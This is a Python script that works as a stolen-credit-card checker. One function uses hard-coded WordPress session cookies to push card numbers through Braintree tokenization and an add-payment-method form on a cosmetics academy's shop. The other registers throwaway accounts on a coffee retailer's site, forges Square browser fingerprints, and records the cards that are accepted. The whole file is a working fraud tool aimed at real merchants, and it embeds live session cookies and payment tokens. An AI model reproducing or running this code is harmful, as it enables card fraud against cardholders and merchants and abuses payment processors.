import requests
import re
import random
import time
import string
import base64
from bs4 import BeautifulSoup
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	with open('fileb3.txt', 'r') as file:
		first_line = file.readline()
	while True:
		lines='''amohamee054%7C1715892365%7Choo5fKH5bXCuxAVbVeiRQGHDG2liv9DZlnQTeYZFDZU%7Ce50cdde7472ebd768475399fbffd548f98080043c2dc4591adace7d22f976915
amkshshz%7C1715894261%7C0vEYZsHPYxwTBgviXJ5FjHjQR4XhDcWITSi9NQvM3ux%7C5571c10ec8234792eee56648f9cbcf45f8c51dcfd66475e7801e3dd4a334045e
ahahbabab%7C1715894599%7CsIWtGRP8IADG48Le8W63ycXvWSAXDRyVfILdTanchoe%7Cc98d3d4a141c3eb8586f9aea5546265b6ab720caed2dd43b7fade3969b2acb34moskomosko701%7C1715895326%7CyiZQnRxqhbf538oOaH9UEbv5fB0W3M6SeeyzCuWa2KP%7C408ea7c59928a80dcaff6607e5e3202a425d34a34a594becd9223d3d60d8453a'''
		lines = lines.strip().split('\n')
		random_line_number = random.randint(0, len(lines) - 1)
		big = lines[random_line_number]
		if big == first_line:
			pass
		else:
			break
	with open('fileb3.txt', 'w') as file:
		file.write(big)
	cookies = {
	    '_ga': 'GA1.1.774315979.1711878714',
	    '_gcl_au': '1.1.169795609.1711878714',
	    'wordpress_logged_in_262b7659d399c680c1ad181f217b3f4d': big,
	    'wfwaf-authcookie-8288059899a58842f2727962646eba72': '2451%7Cother%7Cread%7C61ed8c290d2bf7186e5b6f5cec774f0c6c1594b849562370e6447a4b8b83ccf7',
	    '_ga_J890L8ECJX': 'GS1.1.1711878714.1.1.1711878997.57.0.0',
	}
	
	headers = {
	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'Accept-Language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'Connection': 'keep-alive',
	    # 'Cookie': '_ga=GA1.1.774315979.1711878714; _gcl_au=1.1.169795609.1711878714; wordpress_logged_in_262b7659d399c680c1ad181f217b3f4d=visaspam77%7C1713088332%7Co1IP7tiJpkipfh2yKngvFR4oLuT02D2yLAOwRwGqmDb%7C56bf1ba7db092a0773b738a06eb7fa15b4ffd017038a897c08ef6a9a94812ab2; wfwaf-authcookie-8288059899a58842f2727962646eba72=2451%7Cother%7Cread%7C61ed8c290d2bf7186e5b6f5cec774f0c6c1594b849562370e6447a4b8b83ccf7; _ga_J890L8ECJX=GS1.1.1711878714.1.1.1711878997.57.0.0',
	    'Referer': 'https://www.huntingtonacademy.com/my-account/payment-methods/',
	    'Sec-Fetch-Dest': 'document',
	    'Sec-Fetch-Mode': 'navigate',
	    'Sec-Fetch-Site': 'same-origin',
	    'Sec-Fetch-User': '?1',
	    'Upgrade-Insecure-Requests': '1',
	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	}
	
	response = requests.get('https://www.huntingtonacademy.com/my-account/add-payment-method/', cookies=cookies, headers=headers)
	add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)	
	enc = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', response.text).group(1)
	dec = base64.b64decode(enc).decode('utf-8')
	au=re.findall(r'"authorizationFingerprint":"(.*?)"',dec)[0]
	headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'authorization': f'Bearer {au}',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': '698e6aaa-6b50-4bf0-adc4-d454c57ef68a',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': n,
	                'expirationMonth': mm,
	                'expirationYear': yy,
	                'cvv': cvc,
	                'billingAddress': {
	                    'postalCode': '11743',
	                    'streetAddress': '',
	                },
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	tok = response.json()['data']['tokenizeCreditCard']['token']
	
	# Note: json_data will not be serialized by requests
	# exactly as it was in the original request.
	#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"698e6aaa-6b50-4bf0-adc4-d454c57ef68a"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"4304512200105020","expirationMonth":"10","expirationYear":"2028","cvv":"323","billingAddress":{"postalCode":"11743","streetAddress":""}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
	#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
	import requests
	
	cookies = {
	    '_ga': 'GA1.1.774315979.1711878714',
	    '_gcl_au': '1.1.169795609.1711878714',
	    'wordpress_logged_in_262b7659d399c680c1ad181f217b3f4d': big,
	    'wfwaf-authcookie-8288059899a58842f2727962646eba72': '2451%7Cother%7Cread%7C61ed8c290d2bf7186e5b6f5cec774f0c6c1594b849562370e6447a4b8b83ccf7',
	    '_ga_J890L8ECJX': 'GS1.1.1711878714.1.1.1711878764.10.0.0',
	}
	
	headers = {
	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'Accept-Language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'Cache-Control': 'max-age=0',
	    'Connection': 'keep-alive',
	    'Content-Type': 'application/x-www-form-urlencoded',
	    # 'Cookie': '_ga=GA1.1.774315979.1711878714; _gcl_au=1.1.169795609.1711878714; wordpress_logged_in_262b7659d399c680c1ad181f217b3f4d=visaspam77%7C1713088332%7Co1IP7tiJpkipfh2yKngvFR4oLuT02D2yLAOwRwGqmDb%7C56bf1ba7db092a0773b738a06eb7fa15b4ffd017038a897c08ef6a9a94812ab2; wfwaf-authcookie-8288059899a58842f2727962646eba72=2451%7Cother%7Cread%7C61ed8c290d2bf7186e5b6f5cec774f0c6c1594b849562370e6447a4b8b83ccf7; _ga_J890L8ECJX=GS1.1.1711878714.1.1.1711878764.10.0.0',
	    'Origin': 'https://www.huntingtonacademy.com',
	    'Referer': 'https://www.huntingtonacademy.com/my-account/add-payment-method/',
	    'Sec-Fetch-Dest': 'document',
	    'Sec-Fetch-Mode': 'navigate',
	    'Sec-Fetch-Site': 'same-origin',
	    'Sec-Fetch-User': '?1',
	    'Upgrade-Insecure-Requests': '1',
	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	}
	
	data = {
	    'payment_method': 'braintree_cc',
	    'braintree_cc_nonce_key': tok,
	    'braintree_cc_device_data': '{"device_session_id":"d5e97ccc9f799eb2267d322e412447c7","fraud_merchant_id":null,"correlation_id":"337df1cb3591edc6154038e002f7aa88"}',
	    'braintree_cc_3ds_nonce_key': '',
	    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/88yh4wp5qmm383vy/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/88yh4wp5qmm383vy"},"merchantId":"88yh4wp5qmm383vy","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"kount":{"kountMerchantId":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["Discover","JCB","MasterCard","Visa","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"payWithVenmo":{"merchantId":"3184501200456253861","accessToken":"access_token$production$88yh4wp5qmm383vy$046fed997ac2817cff08e18b6195f802","environment":"production"},"paypalEnabled":true,"paypal":{"displayName":"Huntington Academy of Permanent Cosmetics","clientId":"AVSrt_PxsQbUo8i9Vf3OcqThKuBqMkQGg-hRLlnTHO9r55agBf5KosAkmqFdhrjvnX-iVNe6p3miaPmP","privacyUrl":null,"userAgreementUrl":null,"assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"huntingtonacademyofpermanentcosmetics_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
	    'woocommerce-add-payment-method-nonce': add_nonce,
	    '_wp_http_referer': '/my-account/add-payment-method/',
	    'woocommerce_add_payment_method': '1',
	}
	
	response = requests.post(
	    'https://www.huntingtonacademy.com/my-account/add-payment-method/',
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	text = response.text
	pattern = r'Reason: (.+?)\s*</li>'
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
	else:
		if 'Payment method successfully added.' in text:
			result = "1000: Approved"
		elif 'risk_threshold' in text:
			result = "RISK: Retry this BIN later."
		elif 'Please wait for 20 seconds.' in text:
			result = "try again"
		else:
			result = "Error"
			print('er#')
	if 'avs' in result or '1000: Approved' in result or 'Duplicate' in result or 'Insufficient Funds' in result:
		return 'Approved'
	else:
		return result
def sq(card):
	import requests, re, time, uuid, json, secrets, string, random, user_agent, base64
	card = card.strip()
	parts = re.split('[|:]', card)
	n = parts[0]
	mm = int(parts[1]) 
	yy = parts[2] 
	cvc = parts[3]
	time.sleep(5)
	with open('files.txt', 'r') as file:
		first_line = file.readline()
	if card in first_line:
		return 'Approved'
	if len(yy) == 2:  
		yy = '20' + yy  
	yy = int(yy)

	
	r = requests.Session()
	
	sess = str(uuid.uuid4())
	
	
	token = ''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(80))
	

	
	user = user_agent.generate_user_agent()
	
	random_variable = uuid.uuid4().hex
	
	
	headers = {
		'authority': 'handlebarcoffee.com',
		'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
		'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7,ko-KR;q=0.6,ko;q=0.5',
		'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
		'sec-ch-ua-mobile': '?1',
		'sec-ch-ua-platform': '"Android"',
		'sec-fetch-dest': 'document',
		'sec-fetch-mode': 'navigate',
		'sec-fetch-site': 'none',
		'sec-fetch-user': '?1',
		'upgrade-insecure-requests': '1',
		'user-agent': user,
	}
	
	response = r.get('https://handlebarcoffee.com/my-account/', headers=headers)
	
	
	nonce = (re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1))
	
	
	
	def generate_random_account():
					
		name = ''.join(random.choices(string.ascii_lowercase, k=10))
					
					
		number = ''.join(random.choices(string.digits, k=10))
					
					
		
					
		return f"{name}{number}@gmail.com"
					
	acc = (generate_random_account())

	headers = {
		'authority': 'handlebarcoffee.com',
		'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
		'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7,ko-KR;q=0.6,ko;q=0.5',
		'cache-control': 'max-age=0',
		'content-type': 'application/x-www-form-urlencoded',
		'origin': 'https://handlebarcoffee.com',
		'referer': 'https://handlebarcoffee.com/my-account/',
		'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
		'sec-ch-ua-mobile': '?1',
		'sec-ch-ua-platform': '"Android"',
		'sec-fetch-dest': 'document',
		'sec-fetch-mode': 'navigate',
		'sec-fetch-site': 'same-origin',
		'sec-fetch-user': '?1',
		'upgrade-insecure-requests': '1',
		'user-agent': user,
	}
	
	data = {
		'email': acc,
		'wc_order_attribution_type': 'typein',
		'wc_order_attribution_url': '(none)',
		'wc_order_attribution_utm_campaign': '(none)',
		'wc_order_attribution_utm_source': '(direct)',
		'wc_order_attribution_utm_medium': '(none)',
		'wc_order_attribution_utm_content': '(none)',
		'wc_order_attribution_utm_id': '(none)',
		'wc_order_attribution_utm_term': '(none)',
		'wc_order_attribution_session_entry': 'https://handlebarcoffee.com/my-account/add-payment-method/',
		'wc_order_attribution_session_start_time': '2024-02-10 19:36:18',
		'wc_order_attribution_session_pages': '3',
		'wc_order_attribution_session_count': '1',
		'wc_order_attribution_user_agent': user,
		'mailchimp_woocommerce_newsletter': '1',
		'woocommerce-register-nonce': nonce,
		'_wp_http_referer': '/my-account/',
		'register': 'Register',
	}
	
	response = r.post('https://handlebarcoffee.com/my-account/', headers=headers, data=data)
	
	
	
	
	
	
	
	
	import requests
	
	
	
	headers = {
		'authority': 'handlebarcoffee.com',
		'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
		'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7,ko-KR;q=0.6,ko;q=0.5',
		'cache-control': 'max-age=0',
		'referer': 'https://handlebarcoffee.com/my-account/add-payment-method/',
		'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
		'sec-ch-ua-mobile': '?1',
		'sec-ch-ua-platform': '"Android"',
		'sec-fetch-dest': 'document',
		'sec-fetch-mode': 'navigate',
		'sec-fetch-site': 'same-origin',
		'sec-fetch-user': '?1',
		'upgrade-insecure-requests': '1',
		'user-agent': user,
	}
	
	response = r.get('https://handlebarcoffee.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers)
	
	
	add_nonce = (re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1))
	
	
	application_id = (re.search(r'"application_id":"(.*?)"', response.text).group(1))
	
	
	location_id = (re.search(r'"location_id":"(.*?)"', response.text).group(1))
	
	

	
	import requests
	
	headers = {
		'authority': 'pci-connect.squareup.com',
		'accept': 'application/json',
		'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7,ko-KR;q=0.6,ko;q=0.5',
		'content-type': 'application/json; charset=utf-8',
		'origin': 'https://web.squarecdn.com',
		'referer': 'https://web.squarecdn.com/',
		'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
		'sec-ch-ua-mobile': '?1',
		'sec-ch-ua-platform': '"Android"',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'cross-site',
		'user-agent': user,
	}
	
	params = {
		'applicationId': application_id,
		'hostname': 'handlebarcoffee.com',
		'locationId': location_id,
		'version': '1.54.6',
	}
	
	response = r.get('https://pci-connect.squareup.com/payments/hydrate', params=params, headers=headers)
	
	
	sessionId = (response.json()['sessionId'])
	
	
	
	
	import requests
	
	
	
	headers = {
		'authority': 'pci-connect.squareup.com',
		'accept': 'application/json',
		'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7,ko-KR;q=0.6,ko;q=0.5',
		'content-type': 'application/json; charset=utf-8',
		'origin': 'https://web.squarecdn.com',
		'referer': 'https://web.squarecdn.com/',
		'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
		'sec-ch-ua-mobile': '?1',
		'sec-ch-ua-platform': '"Android"',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'cross-site',
		'user-agent': user,
	}
	
	params = {
		'_': '1707595459707.5847',
		'version': '1.54.6',
	}
	
	json_data = {
		'client_id': application_id,
		'location_id': location_id,
		'payment_method_tracking_id': sess,
		'session_id': sessionId,
		'website_url': 'handlebarcoffee.com',
		'analytics_token': token,
		'card_data': {
			'billing_postal_code': '90011',
			'cvv': cvc,
			'exp_month': mm,
			'exp_year': yy,
			'number': n,
		},
	}
	
	response = r.post(
		'https://pci-connect.squareup.com/v2/card-nonce',
		params=params,
		headers=headers,
		json=json_data,
	)
	
	cnon = (response.json()['card_nonce'])
	print(cnon)
	
	
	
	
	lol = user
	
	import requests
	
	
	headers = {
		'authority': 'connect.squareup.com',
		'accept': '*/*',
		'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7,ko-KR;q=0.6,ko;q=0.5',
		'content-type': 'application/json',
		'origin': 'https://connect.squareup.com',
		'referer': 'https://connect.squareup.com/payments/data/frame.html?referer=https%3A%2F%2Fhandlebarcoffee.com%2Fmy-account%2Fadd-payment-method%2F',
		'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
		'sec-ch-ua-mobile': '?1',
		'sec-ch-ua-platform': '"Android"',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'same-origin',
		'user-agent': user,
	}
	
	json_data = {
		'browser_fingerprint_by_version': [
			{
				'payload_json': '{"components":{"user_agent":"'+lol+'","language":"ar-AE","color_depth":24,"resolution":[892,412],"available_resolution":[892,412],"timezone_offset":-120,"session_storage":1,"local_storage":1,"open_database":1,"cpu_class":"unknown","navigator_platform":"Linux armv81","do_not_track":"unknown","regular_plugins":[],"adblock":false,"has_lied_languages":false,"has_lied_resolution":false,"has_lied_os":false,"has_lied_browser":false,"touch_support":[5,true,true],"js_fonts":["Arial","Courier","Courier New","Georgia","Helvetica","Monaco","Palatino","Tahoma","Times","Times New Roman","Verdana","Wingdings 2","Wingdings 3"]},"fingerprint":"db9863dc7f896661f366c859cadbaf09"}',
				'payload_type': 'fingerprint-v1',
			},
			{
				'payload_json': '{"components":{"language":"ar-AE","color_depth":24,"resolution":[892,412],"available_resolution":[892,412],"timezone_offset":-120,"session_storage":1,"local_storage":1,"open_database":1,"cpu_class":"unknown","navigator_platform":"Linux armv81","do_not_track":"unknown","regular_plugins":[],"adblock":false,"has_lied_languages":false,"has_lied_resolution":false,"has_lied_os":false,"has_lied_browser":false,"touch_support":[5,true,true],"js_fonts":["Arial","Courier","Courier New","Georgia","Helvetica","Monaco","Palatino","Tahoma","Times","Times New Roman","Verdana","Wingdings 2","Wingdings 3"]},"fingerprint":"c14cd05beab4e88696247c07be01a6dc"}',
				'payload_type': 'fingerprint-v1-sans-ua',
			},
		],
		'browser_profile': {
			'components': '{"user_agent":"'+lol+'","language":"ar-AE","color_depth":24,"resolution":[892,412],"available_resolution":[892,412],"timezone_offset":-120,"session_storage":1,"local_storage":1,"open_database":1,"cpu_class":"unknown","navigator_platform":"Linux armv81","do_not_track":"unknown","regular_plugins":[],"adblock":false,"has_lied_languages":false,"has_lied_resolution":false,"has_lied_os":false,"has_lied_browser":false,"touch_support":[5,true,true],"js_fonts":["Arial","Courier","Courier New","Georgia","Helvetica","Monaco","Palatino","Tahoma","Times","Times New Roman","Verdana","Wingdings 2","Wingdings 3"]}',
			'fingerprint': 'db9863dc7f896661f366c859cadbaf09',
			'timezone': '-120',
			'user_agent': user,
			'version': random_variable,
			'website_url': 'https://handlebarcoffee.com/',
		},
		'client_id': application_id,
		'payment_source': cnon,
		'universal_token': {
			'token': location_id,
			'type': 'UNIT',
		},
		'verification_details': {
			'billing_contact': {
				'address_lines': [
					'',
					'',
				],
				'city': '',
				'country': 'US',
				'email': acc,
				'family_name': '',
				'given_name': '',
				'phone': '',
				'postal_code': '',
				'region': 'CA',
			},
			'intent': 'STORE',
		},
	}
	
	response = r.post(
		'https://connect.squareup.com/v2/analytics/verifications',
		headers=headers,
		json=json_data,
	)
	
	verf = (response.json()['token'])
	
	
	
	
	
	
	import requests
	
	
	headers = {
		'authority': 'handlebarcoffee.com',
		'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
		'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7,ko-KR;q=0.6,ko;q=0.5',
		'cache-control': 'max-age=0',
		'content-type': 'application/x-www-form-urlencoded',
		'origin': 'https://handlebarcoffee.com',
		'referer': 'https://handlebarcoffee.com/my-account/add-payment-method/',
		'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
		'sec-ch-ua-mobile': '?1',
		'sec-ch-ua-platform': '"Android"',
		'sec-fetch-dest': 'document',
		'sec-fetch-mode': 'navigate',
		'sec-fetch-site': 'same-origin',
		'upgrade-insecure-requests': '1',
		'user-agent': user,
	}
	
	data = {
		'payment_method': 'square_credit_card',
		'wc-square-credit-card-card-type': 'VISA',
		'wc-square-credit-card-last-four': '0642',
		'wc-square-credit-card-exp-month': '4',
		'wc-square-credit-card-exp-year': '2024',
		'wc-square-credit-card-payment-nonce': cnon,
		'wc-square-credit-card-payment-postcode': '90011',
		'wc-square-credit-card-buyer-verification-token': verf,
		'wc-square-credit-card-tokenize-payment-method': 'true',
		'woocommerce-add-payment-method-nonce': add_nonce,
		'_wp_http_referer': '/my-account/add-payment-method/',
		'woocommerce_add_payment_method': '1',
	}
	
	response = r.post('https://handlebarcoffee.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers, data=data)
	html_text=(response.text)

	pattern = r'Status code (.*?):'
	match = re.search(pattern, html_text)

	if match:
		result = match.group(1)
	else:
		if 'Payment method successfully added.' in html_text or 'Nice! New payment method' in html_text:
			with open('files.txt', '+a') as file:
				file.write(card+'\n')
			result = "1000: Approved"
		elif 'risk_threshold' in html_text:
			result = "RISK: Retry this BIN later."
		else:
			result = "RISK"
			
	if 'avs' in result or '1000: Approved' in result or 'Duplicate' in result or 'Insufficient Funds' in result:
		with open('files.txt', '+a') as file:
			file.write(card+'\n')
		return 'Approved'
	else:
		return result